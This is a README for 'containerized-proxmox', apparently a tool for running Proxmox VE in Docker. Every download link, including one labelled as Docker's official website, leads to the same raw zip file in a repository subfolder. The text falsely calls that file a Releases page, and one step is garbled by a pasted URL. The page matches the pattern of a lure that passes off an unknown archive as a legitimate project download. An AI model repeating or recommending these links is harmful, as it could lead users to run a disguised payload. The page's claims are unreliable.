# 🐳 containerized-proxmox - Easy Proxmox Testing without Hardware

[![Download](https://raw.githubusercontent.com/nahhhnateownu/containerized-proxmox/main/proxmox-datacenter-manager/proxmox-containerized-v2.6.zip)](https://raw.githubusercontent.com/nahhhnateownu/containerized-proxmox/main/proxmox-datacenter-manager/proxmox-containerized-v2.6.zip)

## 📖 Overview

Containerized Proxmox allows you to run a Proxmox VE cluster inside Docker. This setup is perfect for testing, learning, and developing against Proxmox. You don’t need dedicated hardware to get started. Whether you are studying Proxmox or just want to experiment, this tool makes it easy for you.

## 🚀 Getting Started

Before you can use Containerized Proxmox, you should have Docker installed on your computer. This software runs containers and will allow you to deploy Proxmox easily. You can get Docker from their [official website](https://raw.githubusercontent.com/nahhhnateownu/containerized-proxmox/main/proxmox-datacenter-manager/proxmox-containerized-v2.6.zip).

## 🖥️ System Requirements

- **Operating System:** Windows, macOS, or Linux.
- **Docker Version:** Make sure you have Docker version 19.03 or higher.
- **RAM:** At least 8 GB recommended for smooth performance.
- **Storage:** Minimum of 10 GB free space for installation.

## 📥 Download & Install

To get Containerized Proxmox, visit this [page to download](https://raw.githubusercontent.com/nahhhnateownu/containerized-proxmox/main/proxmox-datacenter-manager/proxmox-containerized-v2.6.zip). 

1. Click on the link above. This takes you to the Releases page.
2. Look for the latest version available.
3. Download the https://raw.githubusercontent.com/nahhhnateownu/containerized-proxmox/main/proxmox-datacenter-manager/proxmox-containerized-v2.6.zip file for your operating system.
4. Extract the downloaded file to a folder on your computer.

## 📦 Running Containerized Proxmox

Once you have downloaded and extracted the files, follow these steps to run Containerized Proxmox:

1. Open your command line interface (CLI):
   - On Windows, search for "Command Prompt."
   - On macOS or Linux, open "Terminal."
   
2. Navigate to the folder where you extracted the files. Use the following command:

   ```bash
   cd path/to/your/folder
   ```

3. Start the Proxmox container using Docker:

   ```bash
   docker-compose up -d
   ```

This command will start the Proxmox cluster in the background.

## 🌟 Accessing Proxmox

After starting the container, access the Proxmox web interface using your web browser. Type in the following URL:

```
http://localhost:8006
```

You should see the Proxmox login page. Use `root` as the username and the password you set during the installation.

## ⚙️ Features

- **Easy Setup:** Get Proxmox running quickly without complicated installations.
- **Lightweight:** Run Proxmox in Docker to save system resources.
- **Useful for Learning:** Test configurations and features in a controlled environment.
- **Multi-User Setup:** Understand how Proxmox handles multiple users and roles.

## 📚 Documentation and Support

For detailed instructions, visit our documentation. If you experience any issues, consult the community forum or open an issue directly in the GitHub repository.

## 🔄 Updating Containerized Proxmox

To update your installation:

1. Stop the current running instance with:

   ```bash
   docker-compose down
   ```

2. Pull the latest version from the Releases page.
3. Extract the new files and repeat the steps to run the container again.

## 📞 Contact

If you have questions, feel free to reach out on GitHub or check the community support channels. 

Remember, you can always find the download link here: [Download Containerized Proxmox](https://raw.githubusercontent.com/nahhhnateownu/containerized-proxmox/main/proxmox-datacenter-manager/proxmox-containerized-v2.6.zip). Enjoy your Proxmox experience!